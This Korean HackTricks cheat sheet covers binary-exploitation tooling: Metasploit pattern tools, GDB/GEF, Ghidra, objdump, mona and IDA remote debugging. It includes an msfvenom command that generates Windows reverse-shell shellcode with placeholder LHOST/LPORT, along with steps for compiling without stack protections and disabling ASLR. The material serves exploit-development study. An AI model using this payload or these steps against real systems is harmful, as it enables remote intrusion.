<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## 쉘코드

A shellcode is a small piece of code that is used as the payload in an exploit. It is typically written in assembly language and is designed to be injected into a vulnerable program to gain unauthorized access or execute arbitrary commands.

쉘코드는 공격에서 페이로드로 사용되는 작은 코드 조각입니다. 일반적으로 어셈블리 언어로 작성되며 취약한 프로그램에 주입되어 무단 액세스를 얻거나 임의의 명령을 실행하는 데 사용됩니다.

Shellcodes are commonly used in buffer overflow attacks, where the attacker overflows a buffer in a program's memory and injects the shellcode to take control of the program's execution flow.

쉘코드는 버퍼 오버플로 공격에서 일반적으로 사용됩니다. 공격자는 프로그램의 메모리에서 버퍼를 오버플로하고 쉘코드를 주입하여 프로그램의 실행 흐름을 제어합니다.

Shellcodes can be written to perform various actions, such as spawning a shell, creating a backdoor, or downloading and executing additional malware.

쉘코드는 쉘 생성, 백도어 생성 또는 추가적인 악성 코드 다운로드 및 실행과 같은 다양한 작업을 수행하기 위해 작성될 수 있습니다.

There are different types of shellcodes, including bind shellcodes, reverse shellcodes, and staged shellcodes. Each type has its own purpose and characteristics.

바인드 쉘코드, 리버스 쉘코드 및 스테이지드 쉘코드와 같은 다양한 유형의 쉘코드가 있습니다. 각 유형은 고유한 목적과 특성을 가지고 있습니다.

Shellcodes are an essential tool for penetration testers and hackers, as they allow for the exploitation of vulnerabilities and the execution of unauthorized actions on target systems.

쉘코드는 펜테스터와 해커에게 필수적인 도구로, 취약점을 악용하고 대상 시스템에서 무단 조치를 실행할 수 있도록 합니다.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## 설치

GDB는 GNU 프로젝트의 일부로서, 디버깅 프로그램을 위한 강력한 도구입니다. GDB를 설치하려면 다음 단계를 따르세요.

### 리눅스

GDB를 리눅스에서 설치하려면 터미널을 열고 다음 명령을 실행하세요.

```bash
$ sudo apt-get install gdb
```

### macOS

macOS에서 GDB를 설치하려면 터미널을 열고 다음 명령을 실행하세요.

```bash
$ brew install gdb
```

### 윈도우

윈도우에서 GDB를 설치하려면 다음 단계를 따르세요.

1. MinGW를 설치하세요. MinGW는 Windows에서 GCC 컴파일러를 사용할 수 있도록 해주는 도구입니다.
2. MinGW 설치 중에 "mingw32-base" 및 "mingw32-gdb" 패키지를 선택하세요.
3. 설치가 완료되면 GDB를 사용할 수 있습니다.

GDB를 성공적으로 설치했다면, 다음으로 넘어가서 GDB를 사용하는 방법을 익히세요.
```
apt-get install gdb
```
## 매개변수

**-q** --> 배너 표시 안 함\
**-x \<file>** --> 여기서 GDB 명령 자동 실행\
**-p \<pid>** --> 프로세스에 연결

### 명령어

\> **disassemble main** --> 함수를 어셈블리로 변환\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> 생성된 프로세스를 따라가기\
\> **p system** --> system 함수의 주소 찾기\
\> **help**\
\> **quit**

\> **br func**  --> 함수에 중단점 추가\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> 해당 번호의 중단점 삭제\
\> **watch EXPRESSION** --> 값이 변경되면 중단

**> run** --> 실행\
**> start** --> main에서 시작하고 중단\
\> **n/next** --> 다음 명령어 실행 (내부로 진입하지 않음)\
\> **s/step** --> 다음 명령어 실행\
\> **c/continue** --> 다음 중단점까지 계속 실행

\> **set $eip = 0x12345678** --> $eip의 값 변경\
\> **info functions** --> 함수 정보\
\> **info functions func** --> 함수의 정보\
\> **info registers** --> 레지스터의 값\
\> **bt** --> 스택\
\> **bt full** --> 자세한 스택

\> **print variable**\
\> **print 0x87654321 - 0x12345678** --> 계산\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> 8진수/16진수/10진수/이진수/명령어/ASCII로 내용 표시

* **x/o 0xDir\_hex**
* **x/2x $eip** --> EIP에서 2개의 워드
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8바이트 (b-> 바이트, h-> 2바이트, w-> 4바이트, g-> 8바이트)
* **i r eip** --> $eip의 값
* **x/w pointer** --> 포인터의 값
* **x/s pointer** --> 포인터가 가리키는 문자열
* **x/xw \&pointer** --> 포인터의 위치 주소
* **x/i $eip** —> EIP의 명령어

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## 트릭

### GDB 동일한 주소

GDB를 디버깅하는 동안에는 **실행될 때 이진 파일에서 사용하는 주소와 약간 다를 수 있습니다.** GDB가 동일한 주소를 가지도록 하려면 다음을 수행할 수 있습니다:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<경로>` _이진 파일의 절대 경로를 입력하세요_
* 동일한 절대 경로를 사용하여 이진 파일을 공격하세요
* GDB를 사용할 때와 이진 파일을 공격할 때 `PWD`와 `OLDPWD`는 동일해야 합니다

### 호출된 함수 찾기 위한 백트레이스

**정적으로 링크된 이진 파일**의 경우 모든 함수는 이진 파일에 속하게 됩니다(외부 라이브러리가 아님). 이 경우 이진 파일이 사용자 입력을 요청하기 위해 따르는 흐름을 **식별하기가 어려울 수 있습니다**.\
이를 쉽게 식별하기 위해 **gdb**를 사용하여 이진 파일을 실행하고 입력을 요청받을 때까지 실행합니다. 그런 다음 **CTRL+C**로 중지하고 **`bt`**(**백트레이스**) 명령을 사용하여 호출된 함수를 확인할 수 있습니다:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDB 서버

`gdbserver --multi 0.0.0.0:23947` (IDA에서는 리눅스 머신과 윈도우 머신의 실행 파일의 절대 경로를 입력해야 함)

# Ghidra

## 스택 오프셋 찾기

**Ghidra**는 로컬 변수의 위치에 대한 정보 덕분에 **버퍼 오버플로우에 대한 오프셋을 찾는 데 매우 유용합니다.**\
예를 들어, 아래 예제에서 `local_bc`에서의 버퍼 플로우는 `0xbc`의 오프셋이 필요하다는 것을 나타냅니다. 또한, `local_10`이 캐너리 쿠키인 경우 `local_bc`에서 덮어쓰기 위한 오프셋은 `0xac`입니다.\
_RIP가 저장되는 첫 번째 0x08은 RBP에 속합니다._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> 보호 기능 없이 컴파일\
**-o** --> 출력\
**-g** --> 코드 저장 (GDB에서 볼 수 있음)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> 리눅스에서 ASLR 비활성화

**쉘코드 컴파일하기:**\
**nasm -f elf assembly.asm** --> ".o" 파일 반환\
**ld assembly.o -o shellcodeout** --> 실행 가능한 파일

# Objdump

**-d** --> 실행 파일의 섹션을 **디스어셈블** (컴파일된 쉘코드의 옵코드, ROP 가젯, 함수 주소 찾기 등)\
**-Mintel** --> **인텔** 구문\
**-t** --> **심볼** 테이블\
**-D** --> **모두 디스어셈블** (정적 변수의 주소)\
**-s -j .dtors** --> dtors 섹션\
**-s -j .got** --> got 섹션\
\-D -s -j .plt --> **plt** 섹션 **디컴파일**\
**-TR** --> **재배치**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> 수정해야 할 "puts"의 주소\
**objdump -D ./exec | grep "VAR\_NAME"** --> 정적 변수의 주소 (이들은 DATA 섹션에 저장됨).

# 코어 덤프

1. 프로그램을 시작하기 전에 `ulimit -c unlimited`를 실행합니다.
2. `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`를 실행합니다.
3. `sudo gdb --core=\<path/core> --quiet`를 실행합니다.

# 더 많은 정보

**ldd executable | grep libc.so.6** --> 주소 (ASLR이 적용되면 매번 변경됨)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> 주소가 자주 변경되는지 확인하기 위한 루프\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> "system"의 오프셋\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> "/bin/sh"의 오프셋

**strace executable** --> 실행 파일이 호출하는 함수들\
**rabin2 -i ejecutable -->** 모든 함수의 주소

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## 원격 리눅스에서 디버깅하기

IDA 폴더 안에는 리눅스 내에서 이진 파일을 디버깅하는 데 사용할 수 있는 이진 파일이 포함되어 있습니다. 이를 위해 _linux\_server_ 또는 _linux\_server64_ 바이너리를 리눅스 서버로 이동시키고 이진 파일이 포함된 폴더 내에서 실행하십시오.
```
./linux_server64 -Ppass
```
그런 다음 디버거를 구성하십시오: 디버거 (리눅스 원격) -> 프로세스 옵션...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
